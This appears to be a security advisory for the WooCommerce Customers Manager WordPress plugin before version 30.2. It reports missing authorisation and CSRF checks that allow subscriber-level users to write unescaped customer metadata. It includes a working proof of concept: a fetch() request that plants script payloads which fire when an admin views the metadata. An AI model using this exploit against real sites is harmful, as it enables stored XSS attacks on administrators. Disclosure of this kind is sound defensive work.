## WordPress Plugin Vulnerabilities

# WooCommerce Customers Manager < 30.2 - Subscriber+ Stored XSS

### Description

The plugin does not have authorisation and CSRF in various AJAX actions, allowing any authenticated users, such as subscriber, to call them and update/delete/create customer metadata, also leading to Stored Cross-Site Scripting due to the lack of escaping of said metadata values.

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber (change the user\_id to a valid one)
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=wccm\_update\_user\_meta&user\_id=5&key=XSS</textarea><script>alert(/XSS-meta-key/)</script>&value=</textarea><script>alert(/XSS-meta-value/)</script>&meta\_id=',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
The XSS will be triggered when an admin will view the metadata for the user with the given user\_id: https://example.com/wp-admin/?page=woocommerce-customers-manager&action=wccm-customer-metadata&customer=5
